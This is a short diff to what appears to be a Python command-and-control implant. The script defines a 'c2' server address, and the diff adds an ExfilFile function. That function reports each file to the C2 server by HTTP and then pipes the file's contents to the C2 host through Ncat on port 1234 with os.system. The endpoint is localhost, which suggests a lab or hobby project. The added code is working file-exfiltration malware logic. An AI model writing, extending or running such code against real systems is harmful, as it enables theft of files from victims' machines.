@@ -5,6 +5,12 @@ import time
 
 #Comms
 c2 = 'http://localhost:443'
+c2IPAdress = 'localhost'
+
+def ExfilFile(file, c2, IPAddress):
+    urllib.request.urlopen(f'{c2}/exfil?sid={sid}&file={file}')
+    os.system(f'Ncat {IPAddress} 1234 < {file}')
+    return
 
 #initialiazation, this will set establish a Session ID
 if(os.path.isfile("sid.log")):
